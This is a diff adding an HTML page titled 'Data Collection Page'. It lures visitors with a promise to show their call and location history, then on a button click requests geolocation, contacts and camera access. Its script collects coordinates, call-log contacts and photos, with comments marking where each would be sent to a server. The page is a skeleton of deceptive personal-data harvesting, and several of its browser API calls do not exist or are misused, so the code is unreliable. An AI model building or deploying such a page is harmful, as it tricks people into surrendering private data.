@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Data Collection Page</title>
+</head>
+<body>
+<div id="main">
+  <h1>Hi there!</h1>
+  <p>You can easily see your nearer call history, location history, etc.</p>
+  <button id="startButton">LET'S START</button>
+</div>
+
+<div id="permissionDenied" style="display: none;">
+  <h2>Permission Denied</h2>
+  <p>Please grant all the permissions to proceed.</p>
+</div>
+
+<script>
+document.getElementById("startButton").addEventListener("click", function() {
+  // Ask for permissions
+  navigator.permissions.query({name:'geolocation'}).then(function(result) {
+    if (result.state === 'granted') {
+      getLocation();
+    } else {
+      showPermissionDenied();
+    }
+  });
+
+  if ("contacts" in navigator) {
+    navigator.contacts.requestPermission().then(function(permissions) {
+      if (permissions === "granted") {
+        getCallHistory();
+      } else {
+        showPermissionDenied();
+      }
+    });
+  } else {
+    showPermissionDenied();
+  }
+
+  if ("camera" in navigator.mediaDevices) {
+    navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
+      stream.getTracks().forEach(function(track) {
+        track.stop();
+      });
+      collectPhotos();
+    }).catch(function() {
+      showPermissionDenied();
+    });
+  } else {
+    showPermissionDenied();
+  }
+});
+
+function getLocation() {
+  navigator.geolocation.getCurrentPosition(function(position) {
+    // Send location data
+    var latitude = position.coords.latitude;
+    var longitude = position.coords.longitude;
+    // Here you would send latitude and longitude to the server
+    alert("Location data collected:\nLatitude: " + latitude + "\nLongitude: " + longitude);
+  });
+}
+
+function getCallHistory() {
+  if ("contacts" in navigator) {
+    navigator.contacts.select(["*"]).then(function(contacts) {
+      // Extract call history
+      var callHistory = [];
+      contacts.forEach(function(contact) {
+        if (contact.recordType === "calllog") {
+          callHistory.push(contact);
+        }
+      });
+      // Here you would send call history to the server
+      alert("Call history collected:\nTotal Calls: " + callHistory.length);
+    });
+  }
+}
+
+function collectPhotos() {
+  // Access user's photos
+  // Here you would access photos and send them to the server
+  alert("Photos collected");
+}
+
+function showPermissionDenied() {
+  document.getElementById("main").style.display = "none";
+  document.getElementById("permissionDenied").style.display = "block";
+}
+</script>
+</body>
+</html>
